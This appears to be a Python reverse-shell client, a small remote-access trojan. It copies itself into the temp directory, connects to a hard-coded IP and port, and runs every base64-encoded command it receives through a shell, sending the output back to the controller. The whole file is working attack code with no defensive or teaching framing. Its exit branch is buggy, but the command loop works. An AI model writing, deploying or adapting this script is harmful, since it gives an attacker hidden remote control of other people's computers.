import socket
import base64, os
import subprocess
import sys
import tempfile

IP = "192.168.25.12"
PORT = 2525

local_temp = tempfile.tempdir
name_obj = sys.argv[0]

if name_obj:
    subprocess.Popen('cp %s %s'%(name_obj, local_temp), shell=True)
    print (local_temp)
    print (name_obj)
else:
    pass
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
ini = "=====**======"
ini = ini.encode()
s.send(ini)

def base64_deco(strings):
    return base64.b64decode(strings.decode())

def main():
    while True:
        data = base64_deco(s.recv(1024))
        if data[:1] == '/exit':
            sys.close()
            s.close()
            close()
        # if 'cd '.encode() in data:
        #     os.chdir(data[3:].strip("\n"))
        
        sub = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = sub.stderr.read()+sub.stdout.read()
        s.send(output)
def client():
    main()

client()
